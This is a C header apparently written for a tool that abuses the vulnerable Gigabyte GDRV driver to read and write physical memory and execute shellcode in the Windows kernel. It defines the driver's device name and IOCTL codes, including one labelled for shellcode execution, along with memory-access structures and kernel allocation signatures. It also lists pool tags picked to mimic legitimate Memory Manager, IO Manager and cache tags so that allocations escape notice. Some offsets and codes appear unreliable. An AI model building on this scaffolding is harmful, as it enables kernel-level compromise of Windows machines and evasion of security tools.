#pragma once
#include <Windows.h>
#include <winternl.h>

// WDK types and structures
typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute,
    PagedPool,
    NonPagedPoolNx,
    NonPagedPoolNxCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAligned,
} POOL_TYPE;

typedef struct _KTHREAD {
    // Only defining the fields we need
    UINT8 Padding1[0x28];  // Padding to stack base offset 
    UINT64 StackBase;      // Offset 0x28 - Stack base pointer
    UINT64 StackLimit;     // Next field after stack base
} KTHREAD, *PKTHREAD;

typedef struct _DRIVER_OBJECT {
    USHORT Type;
    USHORT Size;
    PVOID DeviceObject;
    ULONG Flags;
    PVOID DriverStart;
    ULONG DriverSize;
    PVOID DriverSection;
    PVOID DriverExtension;
    UNICODE_STRING DriverName;
    PUNICODE_STRING HardwareDatabase;
    PVOID FastIoDispatch;
    PVOID DriverInit;
    PVOID DriverStartIo;
    PVOID DriverUnload;
    PVOID MajorFunction[28];
} DRIVER_OBJECT, *PDRIVER_OBJECT;

// GDRV driver definitions
#define GDRV_DEVICE L"\\\\.\\GIO"
#define GDRV_IOCTL_READ_MEMORY       0x80102040
#define GDRV_IOCTL_WRITE_MEMORY      0x80102044
#define GDRV_IOCTL_EXECUTE_SHELLCODE 0x80102050  // Custom IOCTL for shellcode execution

// Memory access structures
typedef struct _GDRV_MEMORY_READ {
    UINT64 Address;  // Physical address to read from
    UINT64 Length;   // Length of data to read
    UINT64 Buffer;   // Buffer to store read data
} GDRV_MEMORY_READ, *PGDRV_MEMORY_READ;

typedef struct _GDRV_MEMORY_WRITE {
    UINT64 Address;  // Physical address to write to
    UINT64 Length;   // Length of data to write
    UINT64 Buffer;   // Buffer containing data to write
} GDRV_MEMORY_WRITE, *PGDRV_MEMORY_WRITE;

// Kernel function signatures
typedef PVOID (*ExAllocatePool2Fn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
typedef VOID (*ExFreePoolFn)(PVOID P);

// System module information structures
typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

// Kernel constants
#define POOL_TAGS_COUNT 5
static const ULONG POOL_TAGS[POOL_TAGS_COUNT] = {
    'tNmM', // MmNt - Mimics Memory Manager tags
    'RnoI', // IoNR - Mimics IO Manager tags  
    'ldKS', // SKdl - System tags
    'eFcA', // AcFe - Appears as standard file system cache
    'rDvH'  // HvDr - Hypervisor Driver tag
};

#define SystemBasicInformation 0
#define SystemModuleInformation 11
